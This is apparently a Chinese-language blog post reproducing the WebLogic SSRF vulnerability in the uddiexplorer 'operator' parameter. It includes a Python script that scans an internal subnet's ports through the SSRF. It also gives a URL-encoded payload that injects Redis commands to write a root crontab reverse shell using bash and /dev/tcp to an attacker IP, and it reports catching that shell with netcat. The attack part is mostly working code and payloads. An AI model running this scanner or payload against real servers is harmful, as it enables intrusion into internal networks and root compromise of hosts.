---
title: Weblogic SSRF漏洞
date: 2020-07-08 20:56:39
categories: 漏洞复现
tags: Weblogic
---

#### 背景

Weblogic存在一个SSRF漏洞，可以探测内网服务，也可攻击内网设备

<!--more-->

#### 复现过程

漏洞存在于以下url的**operator**参数

```
http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001
```

访问存在的7001端口，会返回404 error code

![](http://qn.laohuan.xin/2020-07-03_16-38-14.png)

访问不存在的端口会返回not connect

![](http://qn.laohuan.xin/2020-07-03_16-36-35.png)

根据不同端口返回的状态不同，可以来探测内网端口的开放情况

端口探测脚本

```
import thread
import time
import re
import requests


def ite_ip(ip):
    for i in range(1, 256):
        final_ip = '{ip}.{i}'.format(ip=ip, i=i)
        print final_ip
        thread.start_new_thread(scan, (final_ip,))
        time.sleep(3)

def scan(final_ip):
    ports = ('21', '22', '23', '53', '80', '135', '139', '443', '445', '1080', '1433', '1521', '3306', 
'3389', '4899', '8080', '7001', '8000','6389','6379')
    for port in ports:
        vul_url = 'http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&tx
tSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://%
s:%s&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Se
arch' % (final_ip,port)
        try:
            #print vul_url
            r = requests.get(vul_url, timeout=15, verify=False)
            result1 = re.findall('weblogic.uddi.client.structures.exception.XML_SoapException',r.conten
t)
            result2 = re.findall('but could not connect', r.content)
            result3 = re.findall('No route to host', r.content)  
            if len(result1) != 0 and len(result2) == 0 and len(result3) == 0:
                print '[!]'+final_ip + ':' + port
        except Exception, e:
            pass


if __name__ == '__main__':
    ip = "192.168.16"  
    if ip:
        print ip
        ite_ip(ip)
    else:
        print "no ip"
```

可发现内网开放6379端口，存在redis数据库

![](http://qn.laohuan.xin/2020-07-03_17-03-23.png)

写入redis计划任务反弹shell，在**operator**参数添加pyalaod

```
http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://192.168.16.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F反弹ip%2F反弹端口%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
```

将以上url解码实际为

![](http://qn.laohuan.xin/2020-07-03_20-38-48.png)

NC监听成功反弹shell

![](http://qn.laohuan.xin/2020-07-03_20-42-47.png)

#### 参考链接

<http://github.com/vulhub/vulhub/tree/master/weblogic/ssrf/>

<http://www.jianshu.com/p/42a3bb2b2c2c/>